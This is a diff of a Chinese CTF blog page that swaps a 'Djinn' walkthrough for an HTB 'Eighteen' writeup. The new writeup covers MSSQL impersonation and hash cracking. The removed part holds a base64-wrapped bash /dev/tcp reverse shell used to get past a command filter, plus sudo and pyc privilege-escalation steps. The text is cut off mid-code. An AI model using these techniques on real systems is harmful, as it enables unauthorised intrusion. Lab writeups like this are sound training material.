@@ -13,7 +13,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2025/04/11/djinn/"/>
+    <link rel="canonical" href="http://example.com/2025/11/21/htb_eighteen/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -23,19 +23,20 @@
         
         <meta name="description" content="So many things to hack , such little time to work.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Djinn">
-<meta property="og:url" content="http://example.com/2025/04/11/Djinn/index.html">
+<meta property="og:title" content="HTB - Eighteen Writeup">
+<meta property="og:url" content="http://example.com/2025/11/21/HTB_eighteen/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="So many things to hack , such little time to work.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-04-11T08:00:00.000Z">
-<meta property="article:modified_time" content="2025-09-20T12:06:49.673Z">
+<meta property="article:published_time" content="2025-11-20T17:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-20T17:17:53.152Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="渗透测试">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="pyc反编译">
-<meta property="article:tag" content="RCE绕过">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="MSSQL">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="DMSA">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -59,7 +60,7 @@
     
     <title>
         
-            Djinn | Enchanterの小本本
+            HTB - Eighteen Writeup | Enchanterの小本本
         
     </title>
 
@@ -557,10 +558,10 @@
 			
 			
 			
-			<img src="/images/Djinn_cover.jpg" alt="Djinn" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			<img src="/images/Eighteen_cover.jpg" alt="HTB - Eighteen Writeup" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
 			
 			<div class="w-full flex items-center absolute bottom-0 justify-start">
-				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Djinn</h1>
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">HTB - Eighteen Writeup</h1>
 			</div>
 			
 		</div>
@@ -581,15 +582,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-04-11 16:00</span>
-        <span class="mobile">2025-04-11 16:00</span>
+        <span class="desktop">2025-11-21 01:00</span>
+        <span class="mobile">2025-11-21 01:00</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-09-20 20:06:49</span>
-            <span class="mobile">2025-09-20 20:06:49</span>
+            <span class="desktop">2025-11-21 01:17:53</span>
+            <span class="mobile">2025-11-21 01:17:53</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -617,19 +618,23 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>&nbsp;
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/CTF/">CTF</a>&nbsp;
+                        | <a href="/tags/Windows/">Windows</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/pyc%E5%8F%8D%E7%BC%96%E8%AF%91/">pyc反编译</a>&nbsp;
+                        | <a href="/tags/MSSQL/">MSSQL</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/RCE%E7%BB%95%E8%BF%87/">RCE绕过</a>&nbsp;
+                        | <a href="/tags/Active-Directory/">Active Directory</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/DMSA/">DMSA</a>&nbsp;
                     </li>
                 
             </ul>
@@ -655,176 +660,244 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h2 id="靶机发现端口信息枚举"><a href="#靶机发现端口信息枚举" class="headerlink" title="靶机发现端口信息枚举"></a>靶机发现端口信息枚举</h2><p>nmap扫描结果如下：</p>
-<p><img  
+			<h2 id="HTB-Eighteen-Writeup"><a href="#HTB-Eighteen-Writeup" class="headerlink" title="[HTB-Eighteen] Writeup"></a>[HTB-Eighteen] Writeup</h2><table>
+<thead>
+<tr>
+<th align="left"><strong>机器名称</strong></th>
+<th align="left"><strong>[Eighteen]</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>IP 地址</strong></td>
+<td align="left"><code>10.10.11.95</code></td>
+</tr>
+<tr>
+<td align="left"><strong>操作系统</strong></td>
+<td align="left">Windows</td>
+</tr>
+<tr>
+<td align="left"><strong>难度</strong></td>
+<td align="left">Easy</td>
+</tr>
+<tr>
+<td align="left"><strong>发布日期</strong></td>
+<td align="left">11-16-2025</td>
+</tr>
+<tr>
+<td align="left"><strong>关键词</strong></td>
+<td align="left">[MSSQL, Active Directory, Kerberoasting, Tunneling, DMSA]</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="1-Reconnaissance-信息收集"><a href="#1-Reconnaissance-信息收集" class="headerlink" title="1. Reconnaissance (信息收集)"></a>1. Reconnaissance (信息收集)</h3><h4 id="Nmap-扫描"><a href="#Nmap-扫描" class="headerlink" title="Nmap 扫描"></a>Nmap 扫描</h4><details class="cyan" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>点击查看 Nmap 详细扫描结果 </summary>
+              <div class='content'>
+              <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.132.84</span><br><span class="line">Host is up (0.45s latency).</span><br><span class="line">PORT      STATE   SERVICE  VERSION</span><br><span class="line">80/tcp    open    http     Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Did not follow redirect to [http://eighteen.htb/](http://eighteen.htb/)</span><br><span class="line">1433/tcp open     ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.129.132.84:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2022 RTM</span><br><span class="line">|       number: 16.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2022</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: <span class="literal">false</span></span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2025-11-16T09:50:57</span><br><span class="line">|_Not valid after:  2055-11-16T09:50:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-11-16T13:40:24+00:00; +7h00m02s from scanner <span class="keyword">time</span>.</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   10.129.132.84:1433: </span><br><span class="line">|     Target_Name: EIGHTEEN</span><br><span class="line">|     NetBIOS_Domain_Name: EIGHTEEN</span><br><span class="line">|     NetBIOS_Computer_Name: DC01</span><br><span class="line">|     DNS_Domain_Name: eighteen.htb</span><br><span class="line">|     DNS_Computer_Name: DC01.eighteen.htb</span><br><span class="line">|     DNS_Tree_Name: eighteen.htb</span><br><span class="line">|_    Product_Version: 10.0.26100</span><br><span class="line">5985/tcp open     http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">6666/tcp filtered irc</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using proto 1/icmp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   236.09 ms 10.10.16.1</span><br><span class="line">2   487.15 ms 10.129.132.84</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .</span><br><span class="line"><span class="comment"># Nmap done at Sun Nov 16 01:40:22 2025 -- 1 IP address (1 host up) scanned in 31.51 seconds</span></span><br></pre></td></tr></table></figure></div>
+              </div>
+            </details>
+
+
+  <div class="note p-4 mb-4 rounded-small info icon-padding">
+    <i class="note-icon fa-solid fa-circle-info"></i><p><strong>Note:</strong> <code>1433</code> 端口开着，对应 MSSQL 服务，我们初始靶机提供了一组账号密码可能就是用在这里。 </p>
+
+  </div>
+
+<h3 id="2-Enumeration-服务枚举"><a href="#2-Enumeration-服务枚举" class="headerlink" title="2. Enumeration (服务枚举)"></a>2. Enumeration (服务枚举)</h3><h4 id="Web-Enumeration-Port-80"><a href="#Web-Enumeration-Port-80" class="headerlink" title="Web Enumeration (Port 80)"></a>Web Enumeration (Port 80)</h4><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://img2020.cnblogs.com/blog/700440/202009/700440-20200915100534351-1425751110.png"
-                      alt="img"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120213859761.png"
+                      alt="image-20251120213859761"
                 ></p>
-<h3 id="端口探测-服务探测"><a href="#端口探测-服务探测" class="headerlink" title="端口探测&amp;服务探测"></a>端口探测&amp;服务探测</h3><p>开放了3个端口，21，1337，7331，根据扫描结果知道目标ftp可以使用匿名登录，我们先看看</p>
-<p>使用ftp命令登录上去，通过get批量下载目标文件到本地，查看到如下结果：</p>
+<ul>
+<li><strong>技术栈识别 (Wappalyzer):</strong> IIS</li>
+<li><strong>目录扫描:</strong></li>
+</ul>
+<details class="blue" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>点击查看 Gobuster 扫描结果 </summary>
+              <div class='content'>
+              <p>Bash</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u [http://eighteen.htb](http://eighteen.htb) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,zip,js</span><br><span class="line">———————————————————————————————————————————————————————————————————————————————————————————————————————————————</span><br><span class="line">/login                 (Status: 200) [Size: 1961]                                                                                                      </span><br><span class="line">/register              (Status: 200) [Size: 2421]                                                                                                   </span><br><span class="line">/features              (Status: 200) [Size: 2822]                                                                                                   </span><br><span class="line">/admin                 (Status: 302) [Size: 199] [--&gt; /login]                                                                                           </span><br><span class="line">/logout                (Status: 302) [Size: 189] [--&gt; /]                                                                                                </span><br><span class="line">/dashboard             (Status: 302) [Size: 199] [--&gt; /login] </span><br></pre></td></tr></table></figure></div>
+              </div>
+            </details>
+
+<ul>
+<li><strong>发现:</strong> 一个预算管理的网页，有一个 admin 面板但是需要登录，允许 user 注册。没有 SQL 注入的点位，鉴于我有 MSSQL 的凭据的话我想要先看一下 MSSQL。</li>
+</ul>
+<h4 id="Service-Enumeration"><a href="#Service-Enumeration" class="headerlink" title="Service  Enumeration"></a>Service  Enumeration</h4><p>利用靶机提供的凭据登录一下：</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://img2020.cnblogs.com/blog/700440/202009/700440-20200915100908677-1479386389.png"
-                      alt="img"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120214721662.png"
+                      alt="image-20251120214721662"
                 ></p>
-<p>下下来的文件没什么有用的，有个creds.txt里面是mitu:81229也不知道有什么用</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">creds.txt</span><br><span class="line">	nitu:81299</span><br><span class="line">	</span><br><span class="line">game.txt</span><br><span class="line">	oh and I forgot to tell you I&#x27;ve setup a game for you on port 1337. See if you can reach to the </span><br><span class="line">	final level and get the prize.</span><br><span class="line">	</span><br><span class="line">message.txt</span><br><span class="line">	@nitish81299 I am going on holidays for few days, please take care of all the work. </span><br><span class="line">	And don&#x27;t mess up anything.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="1337端口"><a href="#1337端口" class="headerlink" title="1337端口"></a>1337端口</h3><p>打开会让你进行一个游戏的玩，太菜了不会写脚本看零佬是用了pwn库看着好方便啊。</p>
-<p>用kimi写了一个能用的脚本</p>
-<h2 id="web服务探测"><a href="#web服务探测" class="headerlink" title="web服务探测"></a>web服务探测</h2><p>接着，我们对运行http服务的7331端口进行目录扫描，看看能否发现隐藏的目录。</p>
-<p><a target="_blank" rel="noopener" href="https://i.loli.net/2019/12/04/jMSldTLoB5F36z7.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i.loli.net/2019/12/04/jMSldTLoB5F36z7.png"
-                      alt="10.png"
-                ></a></p>
-<p>果不其然，通过目录扫描发现了“&#x2F;wish”和“&#x2F;genie”两个目录，依次访问一下。发现“&#x2F;genie”目录报了403，没有访问权限；而“&#x2F;wish“目录是一个类似命令执行的页面。</p>
-<p><a target="_blank" rel="noopener" href="https://i.loli.net/2019/12/04/FYzBbQ8mpuMvak7.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i.loli.net/2019/12/04/FYzBbQ8mpuMvak7.png"
-                      alt="11.png"
-                ></a></p>
-<p><a target="_blank" rel="noopener" href="https://i.loli.net/2019/12/04/dC1lYucDGmoZAVp.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i.loli.net/2019/12/04/dC1lYucDGmoZAVp.png"
-                      alt="9.png"
-                ></a></p>
-<p>在输入框中输入“id”，页面跳转到了“&#x2F;genie”，并成功执行了命令。</p>
-<p><a target="_blank" rel="noopener" href="https://i.loli.net/2019/12/04/X9ZNtBrSLejbkUW.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i.loli.net/2019/12/04/X9ZNtBrSLejbkUW.png"
-                      alt="12.png"
-                ></a></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接写上反弹命令提示命令被过滤需要绕过</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.55.128/4444 &lt;&amp;1&#x27;&quot;</span> | <span class="built_in">base64</span> </span><br></pre></td></tr></table></figure></div>
-
-<p>得到编码过后的结果，然后用</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;加密字符串&quot;</span> |<span class="built_in">base64</span> -d |bash</span><br></pre></td></tr></table></figure></div>
-
-<p>这行命令url编码后发送并在本地开启监听端口</p>
-<p>成功弹到shell：www-data</p>
+<p>发现了 <code>financial_planner</code> 这个库名，但是 <code>kevin</code> 没有权限。尝试去看看有没有 impersonate 的可能。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i.loli.net/2019/12/04/S9XwhDBUvNEdz2j.png"
-                      alt="img"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120214938331.png"
+                      alt="image-20251120214938331"
                 ></p>
-<h2 id="立足点获取"><a href="#立足点获取" class="headerlink" title="立足点获取"></a>立足点获取</h2><p>当前权限几乎没任何提权的能力，发现passwd下面有两个用户</p>
+<p>发现可以切换到 <code>appdev</code>，并且这个用户能够访问 <code>financial_planner</code> 库。用 PayloadAllTheThing 的命令列出一下数据库的表名，发现有一个 <code>user</code> 表，查出来看看有什么。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i.loli.net/2019/12/04/vNHVTbaWkZeofln.png"
-                      alt="img"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120215939002.png"
+                      alt="image-20251120215939002"
                 ></p>
-<p>nitish之前收集到过一些信息尝试着枚举了一下密码之类的东西，发现没有正确的。</p>
-<p>一头雾水的时候搜了一下creds.txt这个文件，发现了在他的家目录下面有个隐藏文件夹中存在明文的密码</p>
+<a class="button  regular" target="_blank" rel="noopener" href='https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%2520Injection/MSSQL%2520Injection/%23mssql-list-tables' title='MSSQL Injection CheatSheet'><i class='fa-solid fa-list'></i> MSSQL Injection CheatSheet</a>
+
+<p>发现有一个 <code>admin</code> 的用户以及一个 passhash:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133</span><br></pre></td></tr></table></figure></div>
+
+<p>这个 hash 是 <code>10900 | PBKDF2-HMAC-SHA256</code>，但是格式并不正确，需要将后半部分转换成 base64，用脚本转换一下然后用 hashcat 来破解一下。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://s2.ax1x.com/2019/12/04/QlxA74.png"
-                      alt="QlxA74.png"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251120220642189.png"
+                      alt="image-20251120220642189"
                 ></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su nitish</span><br></pre></td></tr></table></figure></div>
+<a class="button  regular" target="_blank" rel="noopener" href='https://github.com/qui113x/Werkzeug-PBKDF2-Hash-Converter' title='PBKDF2 Hash Converter'><i class='fa-brands fa-github'></i> PBKDF2 Hash Converter</a>
 
-<p>转到用户权限</p>
-<h2 id="机器信息收集"><a href="#机器信息收集" class="headerlink" title="机器信息收集"></a>机器信息收集</h2><p>sudo信息</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br></pre></td></tr></table></figure></div>
-
-<p>查询发现可以无密码</p>
-<p>————下面开始就是另外师傅的东西了，我当时没有思路了—————</p>
-<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/12/04/QlxU3t.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://s2.ax1x.com/2019/12/04/QlxU3t.png"
-                      alt="QlxU3t.png"
-                ></a></p>
-<p>使用下面的语句查看一下genie的用法，注意：使用genie -h 可能无法查看全部的用法,发现-p和-cmd两个参数可以执行shell命令</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man genie</span><br></pre></td></tr></table></figure></div>
-
-<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/12/04/QlxWvV.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://s2.ax1x.com/2019/12/04/QlxWvV.png"
-                      alt="QlxWvV.png"
-                ></a></p>
-<p>之后我执行了下面的语句，但是并没有拿到sam的shell</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -p &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></div>
-
-<p>但是我使用-cmd参数，执行下面的命令后，成功获得了sam的shell</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u sam /usr/bin/genie -cmd whoami</span><br></pre></td></tr></table></figure></div>
-
-<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/12/04/QlzrM6.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://s2.ax1x.com/2019/12/04/QlzrM6.png"
-                      alt="QlzrM6.png"
-                ></a></p>
-<p>再次执行</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></div>
-
-<p>查看sudo可以执行的命令，得到了下面的结果</p>
-<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/12/04/Qlz2IH.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://s2.ax1x.com/2019/12/04/Qlz2IH.png"
-                      alt="Qlz2IH.png"
-                ></a></p>
-<p>但是执行这条语句之后没有得到有价值的信息，反而让我更加懵逼。。。接着使用下面的命令查找了一下可写的文件，发现了一个&#x2F;home&#x2F;sam&#x2F;.pyc文件，就是进行加密后的python文件。</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
-
-<p><a target="_blank" rel="noopener" href="https://s2.ax1x.com/2019/12/04/Q1S3Yd.png"><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://s2.ax1x.com/2019/12/04/Q1S3Yd.png"
-                      alt="Q1S3Yd.png"
-                ></a></p>
-<p>然后将.pyc文件导出到kali中，进行在线反编译，网址：<a class="link"   target="_blank" rel="noopener" href="https://tool.lu/pyc/%E3%80%82%E5%8F%8D%E7%BC%96%E8%AF%91%E4%B9%8B%E5%90%8E%E5%BE%97%E5%88%B0%E4%BA%86%E5%A6%82%E4%B8%8B%E4%BB%A3%E7%A0%81%EF%BC%9A" >https://tool.lu/pyc/。反编译之后得到了如下代码：<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">from getpass import getuser</span><br><span class="line">from os import system</span><br><span class="line">from random import randint</span><br><span class="line"></span><br><span class="line">def naughtyboi():</span><br><span class="line">    print &#x27;Working on it!! &#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def guessit():</span><br><span class="line">    num = randint(1, 101)</span><br><span class="line">    print &#x27;Choose a number between 1 to 100: &#x27;</span><br><span class="line">    s = input(&#x27;Enter your number: &#x27;)</span><br><span class="line">    if s == num:</span><br><span class="line">        system(&#x27;/bin/sh&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print &#x27;Better Luck next time&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def readfiles():</span><br><span class="line">    user = getuser()</span><br><span class="line">    path = input(&#x27;Enter the full of the file to read: &#x27;)</span><br><span class="line">    print &#x27;User %s is not allowed to read %s&#x27; % (user, path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def options():</span><br><span class="line">    print &#x27;What do you want to do ?&#x27;</span><br><span class="line">    print &#x27;1 - Be naughty&#x27;</span><br><span class="line">    print &#x27;2 - Guess the number&#x27;</span><br><span class="line">    print &#x27;3 - Read some damn files&#x27;</span><br><span class="line">    print &#x27;4 - Work&#x27;</span><br><span class="line">    choice = int(input(&#x27;Enter your choice: &#x27;))</span><br><span class="line">    return choice</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(op):</span><br><span class="line">    if op == 1:</span><br><span class="line">        naughtyboi()</span><br><span class="line">    elif op == 2:</span><br><span class="line">        guessit()</span><br><span class="line">    elif op == 3:</span><br><span class="line">        readfiles()</span><br><span class="line">    elif op == 4:</span><br><span class="line">        print &#x27;work your ass off!!&#x27;</span><br><span class="line">    else:</span><br><span class="line">        print &#x27;Do something better with your life&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main(options())</span><br><span class="line">from getpass import getuser</span><br><span class="line">from os import system</span><br><span class="line">from random import randint</span><br><span class="line"></span><br><span class="line">def naughtyboi():</span><br><span class="line">    print &#x27;Working on it!! &#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def guessit():</span><br><span class="line">    num = randint(1, 101)</span><br><span class="line">    print &#x27;Choose a number between 1 to 100: &#x27;</span><br><span class="line">    s = input(&#x27;Enter your number: &#x27;)</span><br><span class="line">    if s == num:</span><br><span class="line">        system(&#x27;/bin/sh&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print 